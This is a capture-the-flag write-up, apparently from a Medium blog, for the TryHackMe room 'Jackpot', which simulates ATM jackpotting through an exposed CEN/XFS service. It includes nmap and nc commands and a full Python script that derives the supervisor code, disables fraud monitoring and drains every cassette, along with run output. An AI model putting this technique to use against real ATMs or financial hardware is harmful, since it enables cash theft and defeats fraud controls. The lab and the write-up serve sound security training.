# Jackpot

- **Source URL:** https://skin-security.medium.com/jackpot-how-i-emptied-an-atm-without-a-card-or-pin-1d70e9970788
- **Fetched from:** https://skin-security.medium.com/jackpot-how-i-emptied-an-atm-without-a-card-or-pin-1d70e9970788?source=rss-4c56a9da2d99------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14943 (id 14943)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Skin Security / Sun, 11 Oct 2026 19:37:20 GMT

*No card. No PIN. Just a conversation with a machine that trusted anyone who spoke its language.*

That’s the premise of **Jackpot**, a TryHackMe room that drops you in front of a branch ATM pulled offline after a string of unexplained cash-outs. What follows isn’t a web app with a login bypass or an SQL injection — it’s a simulation of real ATM jackpotting malware, the kind of attack tooling like *Ploutus* and *Cutlet Maker* has used against real banks. I’m walking through exactly how I solved it, what the underlying vulnerability actually is, and a Python script that automates the whole chain end to end.

Earth’s National Bank has a terminal — Terminal 004 — that’s been pulled off the network for forensic review. The box description sets up the real story: a maintenance interface meant only for engineers on the branch LAN was left reachable, and it speaks the ATM’s native hardware language with “no authentication worth the name.” Our job: convince the cash dispenser to empty every cassette.

Standard start — a full port sweep:

nmap -p- \<target-ip> --min-rate=5000

Three ports came back:

Port   Service

22 SSH

8080 HTTP - "Branch Engineering Console"

9100 labeled jetdirect (normally a printer port)

That last one is the giveaway. Port 9100 is the classic raw socket port used by HP JetDirect printers — but in this box, it’s been repurposed to carry something a lot more dangerous than a print job.

Port 8080 serves a live dashboard: cassette fill levels, a session status panel, and a line clearly aimed at field technicians — download a “service tool,” run it against the session code currently on screen, and it hands back a supervisor activation code.

That’s our first real lead. The page also states outright what’s underneath: *“bridges authorized branch-LAN requests to the terminal’s local XFS service provider.”*

This is the part worth understanding properly, because it’s the whole point of the box.

**CEN/XFS** (eXtensions for Financial Services) is a real industry-standard protocol. It’s the layer that lets an ATM’s banking application talk to its physical hardware — card reader, pinpad, and critically, the cash dispenser module (CDM). In a correctly built ATM, this layer sits deep inside the machine, completely isolated from any network a customer or attacker could reach. The banking application is the only thing allowed to issue XFS commands, and it only does so after a real, authorized transaction — card inserted, PIN verified, funds checked.

In this box, that hardware-control channel is bridged straight onto the network, on port 9100. And the “authentication” guarding it isn’t a secret at all — it’s a value anyone can compute locally from a session code that’s displayed in plaintext on the console. There’s no challenge-response against a real key, no tie-back to an actual bank transaction, no card, no PIN.

Once you can reach that port and compute that code, you’re not attacking a banking application anymore — you’re issuing commands straight to the dispenser hardware. That’s the core of real-world ATM jackpotting: the malware never touches the bank’s transaction logic at all. It goes around it entirely and talks to the XFS layer directly. This box reproduces that exact bypass.

Connecting raw to port 9100 is where it gets fun — the service hands you its own protocol spec, unprompted, the moment you connect:

nc \<target-ip> 9100

The banner describes a simple binary framing:

It even tells you which command to query for the full command table (0x0304). Querying it hands back the complete CDM command set:

Command                      ID       Purpose

WFS\_INF\_CDM\_STATUS 0x301 Current terminal/cassette state

WFS\_INF\_CDM\_CASH\_UNIT\_INFO 0x303 Cassette details

WFS\_INF\_CDM\_CAPABILITIES 0x304 Command table (the hint command)

WFS\_CMD\_CDM\_DISPENSE 0x401 Dispense cash from a cassette

WFS\_CMD\_CDM\_ARM 0x4f0 Enable supervisor mode

WFS\_CMD\_CDM\_SET\_MONITOR 0x4f1 Toggle fraud monitoring

WFS\_CMD\_CDM\_GET\_FLAG 0x4ff Retrieve the flag once the vault is empty

Downloading the jackpot binary from the console and running file on it shows a small, stripped ELF executable. It's the legitimate field-technician tool the console told us about — feed it the session code, and it prints back a supervisor activation code:

./jackpot \<session-code>

\[\*\] session nonce : 344946

\[\*\] activation code: 00504466

This is the key weak point: the activation code is derived purely from a value already broadcast to anyone looking at the console. There’s no secret the attacker doesn’t already have.

With the activation code in hand, the exploit chain is four moves:

The one real constraint is time: the session nonce refreshes periodically, so the window between fetching it and submitting the derived activation code is tight. Doing this by hand with nc works, but it's a race against a refreshing value — which is exactly why I automated it.

Here’s the full Python client I used to automate the entire chain — grab the fresh nonce, generate the activation code via the local jackpot binary, arm the terminal, kill the fraud monitor, drain every cassette respecting the 40-note cap, then pull the flag:

#!/usr/bin/env python3

"""

Jackpot (TryHackMe) - full auto-solve

Usage: python3 autopwn.py \<target\_ip> \[path\_to\_jackpot\_binary\]

"""

import socket

import struct

import json

import subprocess

import sys

import time

HOST = sys.argv\[1\] if len(sys.argv) > 1 else "10.48.183.147"

PORT = 9100

JACKPOT\_BIN = sys.argv\[2\] if len(sys.argv) > 2 else "./jackpot"

MSG\_TYPES = {"GETINFO": 0x01, "EXECUTE": 0x02}

def recvall(sock, n):

buf = b""

while len(buf) \< n:

chunk = sock.recv(n - len(buf))

if not chunk:

break

buf += chunk

return buf

def send\_cmd(msg\_type\_name, command\_id, data=""):

if isinstance(data, str):

data = data.encode()

pkt = struct.pack(">BIH", MSG\_TYPES\[msg\_type\_name\], command\_id, len(data)) + data

s = socket.create\_connection((HOST, PORT), timeout=5)

# discard the unsolicited banner (len-prefixed JSON sent on connect)

s.settimeout(0.3)

try:

s.recv(65536)

except socket.timeout:

pass

s.settimeout(5)

s.sendall(pkt)

length = struct.unpack(">H", recvall(s, 2))\[0\]

body = recvall(s, length)

s.close()

return json.loads(body)

def get\_activation\_code(nonce):

out = subprocess.check\_output(\[JACKPOT\_BIN, nonce\], text=True)

for line in out.splitlines():

if "activation code" in line:

return line.split(":")\[1\].strip()

raise RuntimeError("could not parse activation code from jackpot output")

def main():

print("\[\*\] Getting status / nonce...")

status = send\_cmd("GETINFO", 0x301)\["status"\]

nonce = status\["nonce"\]

print(f"\[\*\] nonce = {nonce}")

code = get\_activation\_code(nonce)

print(f"\[\*\] activation code = {code}")

print("\[\*\] Arming supervisor mode...")

resp = send\_cmd("EXECUTE", 0x4f0, code)

print(" ", resp)

if resp.get("rc") != "WFS\_SUCCESS":

print("\[!\] ARM failed — nonce likely expired, retry quickly.")

sys.exit(1)

print("\[\*\] Disabling fraud monitor...")

print(" ", send\_cmd("EXECUTE", 0x4f1, "off"))

print("\[\*\] Draining all cassettes...")

status = send\_cmd("GETINFO", 0x301)\["status"\]

for cst in status\["cassettes"\]:

remaining = cst\["count"\]

while remaining > 0:

chunk = min(40, remaining) # max\_dispense cap

data = json.dumps({"cassette": cst\["id"\], "count": chunk})

resp = send\_cmd("EXECUTE", 0x401, data)

print(f" {cst\['id'\]}: -{chunk} ->", resp)

if resp.get("rc") != "WFS\_SUCCESS":

break

remaining -= chunk

time.sleep(0.1)

print("\[\*\] Fetching flag...")

flag\_resp = send\_cmd("GETINFO", 0x4ff)

print(" ", flag\_resp)

if \_\_name\_\_ == "\_\_main\_\_":

main()

Running it end to end:

$ python3 autopwn.py \<target-ip> ./jackpot

\[\*\] Getting status / nonce...

\[\*\] nonce = 664687

\[\*\] activation code = 18184571

\[\*\] Arming supervisor mode...

{'rc': 'WFS\_SUCCESS', 'detail': 'armed - supervisor mode'}

\[\*\] Disabling fraud monitor...

{'rc': 'WFS\_SUCCESS', 'monitor\_on': False}

\[\*\] Draining all cassettes...

CST1: -40 -> {'rc': 'WFS\_SUCCESS', 'notes': 40, 'remaining\_notes': 240}

...

CST3: -20 -> {'rc': 'WFS\_SUCCESS', 'notes': 40, 'remaining\_notes': 0, 'detail': 'vault empty - cashout proven; GET\_FLAG now available'}

\[\*\] Fetching flag...

{'rc': 'WFS\_SUCCESS', 'flag': 'THM{n0\_card\_-------st\_the\_wr0ng---------S}'}

Vault empty, cashout proven, flag captured.

Strip away the CTF framing and this is a textbook case of **missing authentication for a critical function** (CWE-306), wrapped around a protocol that’s genuinely used in production banking hardware. The lesson generalizes well beyond ATMs:
